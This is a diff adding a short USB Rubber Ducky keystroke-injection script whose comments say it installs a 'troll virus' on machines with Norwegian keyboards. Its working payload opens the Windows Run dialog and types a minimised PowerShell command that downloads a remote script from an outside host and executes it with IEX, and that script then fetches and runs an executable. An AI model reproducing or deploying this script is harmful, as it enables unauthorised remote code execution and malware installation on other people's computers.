@@ -1,0 +1,15 @@
+REM
+REM Author: sl3ipnr
+REM 
+REM For more ducky scripts go to https://github.com/sl3ipnr/Ducky 
+REM
+REM The script downloads a ps script and executes it.
+REM The downloaded script will download an exe file, in this case the troll virus
+REM This script is encoded to hosts with norwegian keyboards!!!
+REM
+
+DELAY 1500
+GUI r
+DELAY 700
+STRING cmd /C "start /MIN powershell IEX (New-Object Net.WebClient).DownloadString('https://sl3ipnr.com/troll.ps1');"
+ENTER
